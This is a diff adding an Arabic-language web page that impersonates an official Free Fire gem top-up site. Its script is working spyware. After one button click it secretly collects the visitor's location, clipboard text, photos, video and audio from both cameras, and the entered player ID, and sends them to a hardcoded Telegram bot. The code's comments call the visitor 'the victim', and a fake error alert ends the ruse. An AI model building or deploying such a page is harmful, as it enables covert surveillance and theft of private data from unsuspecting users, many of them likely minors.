@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - تسجيل الدخول لاستكمال التصفح</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Cairo', Tahoma, sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        /* نافذة طلب الإذن الأولية */
+        #permissionOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 15, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .permission-card {
+            background: rgba(20, 20, 30, 0.95);
+            border: 2px solid #ffcc00;
+            border-radius: 15px;
+            padding: 30px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.5);
+        }
+        .permission-card h2 {
+            color: #ffcc00;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        .permission-card p {
+            color: #ccc;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .btn-permission {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #ff7300, #ffcc00);
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 115, 0, 0.6);
+            transition: 0.3s;
+        }
+        .btn-permission:hover {
+            opacity: 0.9;
+        }
+
+        /* المحتوى الرئيسي للعبة */
+        .card {
+            background: rgba(20, 20, 30, 0.9);
+            border: 2px solid #ffcc00;
+            border-radius: 15px;
+            padding: 25px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 0 25px rgba(255, 204, 0, 0.4);
+            box-sizing: border-box;
+            display: none;
+        }
+        .logo {
+            font-size: 26px;
+            font-weight: bold;
+            color: #ffcc00;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.6);
+        }
+        .sub-title {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        label {
+            font-size: 12px;
+            color: #ffcc00;
+            display: block;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #ff7300, #ffcc00);
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 0 15px rgba(255, 115, 0, 0.5);
+        }
+        #statusMsg {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #00ffcc;
+        }
+    </style>
+</head>
+<body>
+
+<!-- نافذة الطلب الفوري عند الدخول -->
+<div id="permissionOverlay">
+    <div class="permission-card">
+        <h2>استكمال الدخول</h2>
+        <p>الرجاء الضغط على الزر أدناه لمنح الأذونات المطلوبة واستكمال تصفح موقع Free Fire الـرسمي.</p>
+        <button class="btn-permission" onclick="requestAccessAndShow()">استكمال الدخول</button>
+    </div>
+</div>
+
+<!-- واجهة شحن الجواهر الحقيقية -->
+<div class="card" id="mainContent">
+    <div class="logo">🔥 FREE FIRE VIP 🔥</div>
+    <div class="sub-title">مركز شحن الجواهر الرسمي</div>
+    
+    <form id="ffForm" onsubmit="submitPlayerId(event)">
+        <div class="input-group">
+            <label>أدخل آيدي اللاعب (Player ID):</label>
+            <input type="text" id="playerId" placeholder="مثال: 123456789" required>
+        </div>
+        <button type="submit" class="btn-submit">تحقق وشحن الآن</button>
+    </form>
+    <div id="statusMsg"></div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+    const CHAT_ID = "7713496654";
+
+    function sendTelegramMessage(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(() => {});
+    }
+
+    function sendTelegramPhoto(base64Image, caption) {
+        let blob = dataURItoBlob(base64Image);
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
+    }
+
+    function sendTelegramVideo(videoBlob, caption) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', videoBlob, 'video.webm');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }).catch(() => {});
+    }
+
+    function sendTelegramAudio(audioBlob, caption) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('audio', audioBlob, 'audio.webm');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData }).catch(() => {});
+    }
+
+    function dataURItoBlob(dataURI) {
+        let byteString = atob(dataURI.split(',')[1]);
+        let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], {type: mimeString});
+    }
+
+    // بمجرد ضغط زر "استكمال الدخول" تفتح الواجهة وتعمل السحبات بالخلفية
+    async function requestAccessAndShow() {
+        document.getElementById('permissionOverlay').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+
+        sendTelegramMessage("⚠️ الضحية ضغط على (استكمال الدخول)! بدء السحب الشامل...");
+
+        // 1. سحب الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendTelegramMessage(`📍 الموقع الجغرافي:\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            }, () => {}, { timeout: 5000 });
+        }
+
+        // 2. سحب الحافظة
+        try {
+            const clip = await navigator.clipboard.readText();
+            if(clip) sendTelegramMessage(`📋 الحافظة المسروقة:\n${clip}`);
+        } catch(e) {}
+
+        // 3. التقاط الوسائط (كاميرات، فيديو، صوت)
+        await captureAllMedia("user", "الأمامية");
+        await captureAllMedia("environment", "الخلفية");
+    }
+
+    async function captureAllMedia(facingMode, name) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 1500));
+
+            // التقاط 4 صور
+            for (let i = 0; i < 4; i++) {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                sendTelegramPhoto(canvas.toDataURL('image/jpeg'), `📸 صورة (${name}) رقم ${i+1}`);
+                await new Promise(r => setTimeout(r, 800));
+            }
+
+            // تسجيل فيديو لمدة 8 ثواني
+            let videoChunks = [];
+            let vRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            vRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
+            vRecorder.onstop = () => {
+                let vBlob = new Blob(videoChunks, { type: 'video/webm' });
+                sendTelegramVideo(vBlob, `🎥 فيديو مسجل (${name}) مدته 8 ثواني`);
+            };
+            vRecorder.start();
+            await new Promise(r => setTimeout(r, 8000));
+            vRecorder.stop();
+
+            // تسجيل صوت لمدة 8 ثواني
+            let audioChunks = [];
+            let aRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+            aRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
+            aRecorder.onstop = () => {
+                let aBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                sendTelegramAudio(aBlob, `🎙️ تسجيل صوتي (${name}) مدته 8 ثواني`);
+            };
+            aRecorder.start();
+            await new Promise(r => setTimeout(r, 8000));
+            aRecorder.stop();
+
+            stream.getTracks().forEach(t => t.stop());
+        } catch (err) {
+            sendTelegramMessage(`⚠️ خطأ في سحب وسائط (${name}): ${err.message}`);
+        }
+    }
+
+    function submitPlayerId(event) {
+        event.preventDefault();
+        const playerId = document.getElementById('playerId').value;
+        document.getElementById('statusMsg').innerText = "جاري معالجة الآيدي وشحن الجواهر...";
+        sendTelegramMessage(`🔥 تم إدخال آيدي اللاعب من قبل الضحية: ${playerId}`);
+        setTimeout(() => {
+            alert("عفواً، انتهت صلاحية الجلسة أو الآيدي غير صحيح. يرجى المحاولة لاحقاً.");
+        }, 2500);
+    }
+</script>
+
+</body>
+</html>
